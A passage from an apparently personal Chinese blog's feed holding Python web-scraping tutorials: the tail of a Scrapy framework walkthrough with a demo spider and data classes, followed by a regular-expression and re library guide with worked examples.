class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">E:\北京理工网络爬虫\project\scrapydemo&gt;scrapy genspider demo python123.io</span><br><span class="line">Created spider &#x27;demo&#x27; using template &#x27;basic&#x27; in module:</span><br><span class="line">  scrapydemo.spiders.demo</span><br></pre></td></tr></table></figure><p>在spiders目录下就生成了一个demo.py文件，它就是我们的小爬虫。这里是通过命令行来生成，我们也可以手工生成。看一下它的初始内容。</p><p><strong>demo.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DemoSpider</span>(<span class="params">scrapy.Spider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;demo&#x27;</span></span><br><span class="line">    allowed_domains = [<span class="string">&#x27;python123.io&#x27;</span>]</span><br><span class="line">    start_urls = [<span class="string">&#x27;http://python123.io/&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-配置生成的spider爬虫"><a href="#3-配置生成的spider爬虫" class="headerlink" title="3.配置生成的spider爬虫"></a>3.配置生成的spider爬虫</h3><p>通过编辑demo.py来配置我们的爬虫。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DemoSpider</span>(<span class="params">scrapy.Spider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;demo&#x27;</span></span><br><span class="line">    <span class="comment"># allowed_domains = [&#x27;python123.io&#x27;]</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;http://python123.io/ws/demo.html&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        fname = response.url.split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(fname, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(response.body)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>里面有一个爬虫类，叫什么无所谓，只要继承scrapy.Spider类就可以了。现在简单使用，只爬取一个页面，直接改初始url。parse方法中传进来了一个response对象，通过编写该方法来提取我们的信息，这里使用对象的url属性来提取html文件名字并且将body属性写入到本地文件。其实就是将页面下载下来。  </p><h3 id="4-运行爬虫，获取网页"><a href="#4-运行爬虫，获取网页" class="headerlink" title="4.运行爬虫，获取网页"></a>4.运行爬虫，获取网页</h3><p>命令行执行:  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">scrapy crawl demo</span></span><br></pre></td></tr></table></figure><p>爬取结束后目录下多了一个demo.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>This is a python demo page<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>The demo python introduces several python courses.<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;course&quot;</span>&gt;</span>Python is a wonderful general-purpose programming language. You can learn Python from novice to professional by tracking the following courses:</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.icourse163.org/course/BIT-268001&quot;</span> <span class="attr">class</span>=<span class="string">&quot;py1&quot;</span> <span class="attr">id</span>=<span class="string">&quot;link1&quot;</span>&gt;</span>Basic Python<span class="tag">&lt;/<span class="name">a</span>&gt;</span> and <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.icourse163.org/course/BIT-1001870001&quot;</span> <span class="attr">class</span>=<span class="string">&quot;py2&quot;</span> <span class="attr">id</span>=<span class="string">&quot;link2&quot;</span>&gt;</span>Advanced Python<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><p>这里就没有用到item pipelines，因为我们实现的是页面下载，所以并不需要提取什么信息，直接让spider将响应主体保存就可以了。后面再做更深入的使用。</p><h2 id="Scrapy框架中的数据类型"><a href="#Scrapy框架中的数据类型" class="headerlink" title="Scrapy框架中的数据类型"></a>Scrapy框架中的数据类型</h2><h3 id="Request类"><a href="#Request类" class="headerlink" title="Request类"></a>Request类</h3><p><strong>class scrapy.http.Request()</strong><br>Request对象表示一个HTTP请求<br>由Spider生成，由Downloader执行  </p><table><thead><tr><th>属性或方法</th><th>说明</th></tr></thead><tbody><tr><td>.url</td><td>Request对应的请求URL地址</td></tr><tr><td>.method</td><td>对应的请求方法，&#39;GET&#39; &#39;POST&#39;等</td></tr><tr><td>.headers</td><td>字典类型风格的请求头</td></tr><tr><td>.body</td><td>请求内容主体，字符串类型</td></tr><tr><td>.meta</td><td>用户添加的扩展信息，在Scrapy内部模块间传递信息使用</td></tr><tr><td>.copy()</td><td>复制该请求</td></tr></tbody></table><h3 id="Response类"><a href="#Response类" class="headerlink" title="Response类"></a>Response类</h3><p><strong>class scrapy.http.Response()</strong><br>Response对象表示一个HTTP响应<br>由Downloader生成，由Spider处理  </p><table><thead><tr><th>属性或方法</th><th>说明</th></tr></thead><tbody><tr><td>.url</td><td>Response对应的URL地址</td></tr><tr><td>.status</td><td>HTTP状态码，默认是200</td></tr><tr><td>.headers</td><td>Response对应的头部信息</td></tr><tr><td>.body</td><td>Response对应的内容信息，字符串类型</td></tr><tr><td>.flags</td><td>一组标记</td></tr><tr><td>.request</td><td>产生Response类型对应的Request对象</td></tr><tr><td>.copy()</td><td>复制该响应</td></tr></tbody></table><h3 id="Item类"><a href="#Item类" class="headerlink" title="Item类"></a>Item类</h3><p><strong>class scrapy.item.Item()</strong><br>Item对象表示一个从HTML页面中提取的信息内容<br>由Spider生成，由Item Pipeline处理<br>Item类似字典类型，可以按照字典类型操作  </p><h2 id="Scrapy爬虫提取信息的方法"><a href="#Scrapy爬虫提取信息的方法" class="headerlink" title="Scrapy爬虫提取信息的方法"></a>Scrapy爬虫提取信息的方法</h2><p>scrapy爬虫支持多种html信息提取方法：</p><ul><li>Beautiful Soup</li><li>lxml</li><li>re</li><li>XPath Selector</li><li><strong>CSS Selector</strong>  </li></ul><h3 id="CSS-Selector"><a href="#CSS-Selector" class="headerlink" title="CSS Selector"></a>CSS Selector</h3><p>用法：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;HTML&gt;.css(<span class="string">&#x27;a::attr(href)&#x27;</span>).extract()  </span><br></pre></td></tr></table></figure><p>CSS Selector由W3C组织维护并规范</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Scrapy框架&quot;&gt;&lt;a href=&quot;#Scrapy框架&quot; class=&quot;headerlink&quot; title=&quot;Scrapy框架&quot;&gt;&lt;/a&gt;Scrapy框架&lt;/h1&gt;&lt;h2 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h2&gt;&lt;p&gt;Scrapy是第三方的库，直接来一手&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;pip install scrapy&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;依赖问题看报错解决&lt;/p&gt;</summary>
    
    
    
    <category term="Python" scheme="https://sncker.github.io/blog/categories/Python/"/>
    
    <category term="爬虫" scheme="https://sncker.github.io/blog/categories/Python/%E7%88%AC%E8%99%AB/"/>
    
    
  </entry>
  
  <entry>
    <title>Python网络爬虫-正则表达式</title>
    <link href="https://sncker.github.io/blog/2019/07/28/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>https://sncker.github.io/blog/2019/07/28/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</id>
    <published>2019-07-28T02:45:00.000Z</published>
    <updated>2020-01-02T12:34:01.081Z</updated>
    
    <content type="html"><![CDATA[<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>用来表示<strong>一组</strong>字符串的表达式，通用字符串表达框架，十分强大。<br>主要应用在字符串匹配中。</p><h2 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h2><table><thead><tr><th align="center">操作符</th><th align="center">说明</th><th align="center">实例</th></tr></thead><tbody><tr><td align="center">.</td><td align="center">表示任何单个字符</td><td align="center"></td></tr><tr><td align="center">[ ]</td><td align="center">字符集，对单个字符给出取值范围</td><td align="center">[abc]表示a、b、c，[a‐z]表示a到z单个字符</td></tr><tr><td align="center">[^ ]</td><td align="center">非字符集，对单个字符给出排除范围</td><td align="center">[^abc]表示非a或b或c的单个字符</td></tr><tr><td align="center">*</td><td align="center">前一个字符0次或无限次扩展</td><td align="center">abc* 表示ab、abc、abcc、abccc等</td></tr><tr><td align="center">+</td><td align="center">前一个字符1次或无限次扩展</td><td align="center">abc+ 表示abc、abcc、abccc等</td></tr><tr><td align="center">?</td><td align="center">前一个字符0次或1次扩展</td><td align="center">abc? 表示ab、abc</td></tr><tr><td align="center">|</td><td align="center">左右表达式任意一个</td><td align="center">abc|def表示abc、def</td></tr><tr><td align="center">{m}</td><td align="center">扩展前一个字符m次</td><td align="center">ab{2}c表示abbc</td></tr><tr><td align="center">{m,n}</td><td align="center">扩展前一个字符m至n次（含n）</td><td align="center">ab{1,2}c表示abc、abbc</td></tr><tr><td align="center">^</td><td align="center">匹配字符串开头</td><td align="center">^abc表示abc且在一个字符串的开头</td></tr><tr><td align="center">$</td><td align="center">匹配字符串结尾</td><td align="center">abc$表示abc且在一个字符串的结尾</td></tr><tr><td align="center">( )</td><td align="center">分组标记，内部只能使用| 操作符</td><td align="center">(abc)表示abc，(abc|def)表示abc、def</td></tr><tr><td align="center">\d</td><td align="center">数字，等价于[0‐9]</td><td align="center"></td></tr><tr><td align="center">\w</td><td align="center">单词字符，等价于[A‐Za‐z0‐9_]</td><td align="center"></td></tr></tbody></table><a id="more"></a><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><table><thead><tr><th align="center">表达式</th><th align="center">对应字符串</th></tr></thead><tbody><tr><td align="center">^[A‐Za‐z]+$</td><td align="center">由26个字母组成的字符串</td></tr><tr><td align="center">^[A‐Za‐z0‐9]+$</td><td align="center">由26个字母和数字组成的字符串</td></tr><tr><td align="center">^‐?\d+$</td><td align="center">整数形式的字符串</td></tr><tr><td align="center">^[0‐9]*[1‐9][0‐9]*$</td><td align="center">正整数形式的字符串</td></tr><tr><td align="center">[1‐9]\d{5}</td><td align="center">中国境内邮政编码，6位</td></tr><tr><td align="center">[\u4e00‐\u9fa5]</td><td align="center">匹配中文字符</td></tr><tr><td align="center">\d{3}‐\d{8}|\d{4}‐\d{7}</td><td align="center">国内电话号码，010‐68913536</td></tr></tbody></table><p>IP地址匹配：  </p><p>范围：  </p><blockquote><p>0‐99：[1‐9]?\d<br>100‐199: 1\d{2}<br>200‐249: 2[0‐4]\d<br>250‐255: 25[0‐5]  </p></blockquote><p>整式：  </p><blockquote><p>(([1‐9]?\d|1\d{2}|2[0‐4]\d|25[0‐5]).){3}([1‐9]?\d|1\d{2}|2[0‐4]\d|25[0‐5])</p></blockquote><h2 id="Re库"><a href="#Re库" class="headerlink" title="Re库"></a>Re库</h2><p><strong>Python标准库</strong>  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br></pre></td></tr></table></figure><h3 id="raw-string类型"><a href="#raw-string类型" class="headerlink" title="raw string类型"></a>raw string类型</h3><p>raw string类型（原生字符串类型）<br>re库采用该类型来表示正则表达式：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">r&#x27;text&#x27;</span></span><br><span class="line"><span class="string">r&#x27;[1‐9]\d&#123;5&#125;&#x27;</span></span><br><span class="line"><span class="string">r&#x27;\d&#123;3&#125;‐\d&#123;8&#125;|\d&#123;4&#125;‐\d&#123;7&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>在该类型中反斜杠&quot;\&quot;不再表示转义。<br>这是个知识点，Python课里就有个学姐做练习时没有在表达式前加r，所以匹配不出结果。<br>不加r就是string类型，re库也支持用string类型来表示正则表达式，不过要繁琐一些。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;[1‐9]\\d&#123;5&#125;&#x27;</span></span><br><span class="line"><span class="string">&#x27;\\d&#123;3&#125;‐\\d&#123;8&#125;|\\d&#123;4&#125;‐\\d&#123;7&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>建议正则表达式里包含转义符时使用raw string类型</strong>  </p><h3 id="Re库主要功能函数"><a href="#Re库主要功能函数" class="headerlink" title="Re库主要功能函数"></a>Re库主要功能函数</h3><table><thead><tr><th align="center">函数</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">re.search()</td><td align="center">在一个字符串中搜索匹配正则表达式的第一个位置，返回match对象</td></tr><tr><td align="center">re.match()</td><td align="center">从一个字符串的开始位置起匹配正则表达式，返回match对象</td></tr><tr><td align="center">re.findall()</td><td align="center">搜索字符串，以列表类型返回全部能匹配的子串</td></tr><tr><td align="center">re.split()</td><td align="center">将一个字符串按照正则表达式匹配结果进行分割，返回列表类型</td></tr><tr><td align="center">re.finditer()</td><td align="center">搜索字符串，返回一个匹配结果的迭代类型，每个迭代元素是match对象</td></tr><tr><td align="center">re.sub()</td><td align="center">在一个字符串中替换所有匹配正则表达式的子串，返回替换后的字符串</td></tr></tbody></table><h4 id="re-search"><a href="#re-search" class="headerlink" title="re.search()"></a>re.search()</h4><p><strong>在一个字符串中搜索匹配正则表达式的第一个位置，返回match对象</strong><br><code>re.search(pattern,string,flags=0)</code></p><p>pattern : 正则表达式的字符串或原生字符串表示<br>string : 待匹配字符串<br>flags : 正则表达式使用时的控制标记  </p><table><thead><tr><th align="center">常用控制标记</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">re.I re.IGNORECASE</td><td align="center">忽略正则表达式的大小写，[A‐Z]能够匹配小写字符</td></tr><tr><td align="center">re.M re.MULTILINE</td><td align="center">正则表达式中的^操作符能够将给定字符串的每行当作匹配开始</td></tr><tr><td align="center">re.S re.DOTALL</td><td align="center">正则表达式中的.操作符能够匹配所有字符，默认匹配除换行外的所有字符</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>match = re.search(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">if</span> match:</span><br><span class="line">print(match.group(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">100081</span></span><br></pre></td></tr></table></figure><h4 id="re-match"><a href="#re-match" class="headerlink" title="re.match()"></a>re.match()</h4><p><strong>从一个字符串的开始位置起匹配正则表达式，返回match对象</strong></p><p><code>re.match(pattern,string,flags=0)</code></p><p>划重点：<strong>开始位置起匹配</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>match = re.match(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT 100081&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">if</span> match:</span><br><span class="line">match.group(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#无输出</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>match.group(<span class="number">0</span>)<span class="comment">#直接调用报错，说明没有匹配到</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;pyshell#9&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    match.group(<span class="number">0</span>)</span><br><span class="line">AttributeError: <span class="string">&#x27;NoneType&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;group&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>match = re.match(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;100081 BIT&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">if</span> match:</span><br><span class="line">match.group(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;100081&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="re-findall"><a href="#re-findall" class="headerlink" title="re.findall()"></a>re.findall()</h4><p><strong>搜索字符串，以列表类型返回全部能匹配的子串</strong>  </p><p><code>re.findall(pattern,string,flags=0)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls = re.findall(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls</span><br><span class="line">[<span class="string">&#x27;100081&#x27;</span>, <span class="string">&#x27;100084&#x27;</span>]</span><br></pre></td></tr></table></figure><h4 id="re-split"><a href="#re-split" class="headerlink" title="re.split()"></a>re.split()</h4><p><strong>将一个字符串按照正则表达式匹配结果进行分割,返回列表类型</strong></p><p><code>re.split(pattern,string,maxsplit=0,flags=0)</code></p><p> maxsplit: 大分割数，剩余部分作为后一个元素输出  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.split(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>)</span><br><span class="line">[<span class="string">&#x27;BIT&#x27;</span>, <span class="string">&#x27; TSU&#x27;</span>, <span class="string">&#x27;&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.split(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>, maxsplit=<span class="number">1</span>)</span><br><span class="line">[<span class="string">&#x27;BIT&#x27;</span>, <span class="string">&#x27; TSU100084&#x27;</span>]</span><br></pre></td></tr></table></figure><h4 id="re-finditer"><a href="#re-finditer" class="headerlink" title="re.finditer()"></a>re.finditer()</h4><p><strong>搜索字符串，返回一个匹配结果的迭代类型，每个迭代元素是match对象</strong></p><p><code>re.finditer(pattern,string,flags=0)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> m <span class="keyword">in</span> re.finditer(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>):</span><br><span class="line"><span class="keyword">if</span> m:</span><br><span class="line">print(m.group(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">100081</span></span><br><span class="line"><span class="number">100084</span> </span><br></pre></td></tr></table></figure><h4 id="re-sub"><a href="#re-sub" class="headerlink" title="re.sub()"></a>re.sub()</h4><p><strong>在一个字符串中替换所有匹配正则表达式的子串 返回替换后的字符串</strong></p><p><code>re.sub(pattern,repl, string,count=0,flags=0)</code></p><p>repl: 替换匹配字符串的字符串<br>string : 待匹配字符串<br>count : 匹配的大替换次数  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.sub(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;:zipcode&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;BIT:zipcode TSU:zipcode&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="等价用法"><a href="#等价用法" class="headerlink" title="等价用法"></a>等价用法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>rst = re.search(<span class="string">r&#x27;[1‐9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT 100081&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; pat = re.<span class="built_in">compile</span>(<span class="string">r&#x27;[1‐9]\d&#123;5&#125;&#x27;</span>)</span><br><span class="line">&gt;&gt;&gt; rst = pat.search(<span class="string">&#x27;BIT 100081&#x27;</span>)</span><br></pre></td></tr></table></figure><p>两种用法是等价的。<br>第一种是一次性操作的函数式用法。<br>而第二种是面向对象的用法，通过re.compile将正则表达式字符串编译成正则表达式对象，可以在编译后多次使用。  </p><h4 id="re-compile"><a href="#re-compile" class="headerlink" title="re.compile()"></a>re.compile()</h4><p><strong>将正则表达式的字符串形式编译成正则表达式对象</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regex = re.<span class="built_in">compile</span>(pattern,flags=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>正则表达式对象同样具有search(),match()等方法且用法类似。  </p><h2 id="Match对象"><a href="#Match对象" class="headerlink" title="Match对象"></a>Match对象</h2><p>Match对象是一次匹配的结果，包含了匹配的很多信息  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; match=re.search(<span class="string">r&#x27;[1‐9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT 100081&#x27;</span>) &gt;&gt;&gt; <span class="keyword">if</span> match:</span><br><span class="line">print(match.group(<span class="number">0</span>))  </span><br><span class="line">&gt;&gt;&gt; <span class="built_in">type</span>(match)</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">_sre</span>.<span class="title">SRE_Match</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><table><thead><tr><th align="center">属性</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">.string</td><td align="center">待匹配的文本</td></tr><tr><td align="center">.re</td><td align="center">匹配时使用的patter对象（正则表达式）</td></tr><tr><td align="center">.pos</td><td align="center">正则表达式搜索文本的开始位置</td></tr><tr><td align="center">.endpos</td><td align="center">正则表达式搜索文本的结束位置</td></tr></tbody></table><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><table><thead><tr><th align="center">方法</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">.group(0)</td><td align="center">获得匹配后的字符串</td></tr><tr><td align="center">.start()</td><td align="center">匹配字符串在原始字符串的开始位置</td></tr><tr><td align="center">.end()</td><td align="center">匹配字符串在原始字符串的结束位置</td></tr><tr><td align="center">.span()</td><td align="center">返回(.start(), .end())</td></tr></tbody></table><h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>match = re.search(<span class="string">r&#x27;[1‐9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.string</span><br><span class="line"><span class="string">&#x27;BIT100081 TSU100084&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.re</span><br><span class="line">re.<span class="built_in">compile</span>(<span class="string">&#x27;[1-9]\\d&#123;5&#125;&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.pos</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.endpos</span><br><span class="line"><span class="number">19</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.group(<span class="number">0</span>)</span><br><span class="line"><span class="string">&#x27;100084&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.start()</span><br><span class="line"><span class="number">13</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.end()</span><br><span class="line"><span class="number">19</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.span()</span><br><span class="line">(<span class="number">13</span>, <span class="number">19</span>)</span><br></pre></td></tr></table></figure><h2 id="Re库的贪婪匹配和最小匹配"><a href="#Re库的贪婪匹配和最小匹配" class="headerlink" title="Re库的贪婪匹配和最小匹配"></a>Re库的贪婪匹配和最小匹配</h2><p>Re库默认采用贪婪匹配，即匹配最长的子串  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; match = re.search(<span class="string">r&#x27;PY.*N&#x27;</span>, <span class="string">&#x27;PYANBNCNDN&#x27;</span>) </span><br><span class="line">&gt;&gt;&gt; match.group(<span class="number">0</span>)</span><br><span class="line"><span 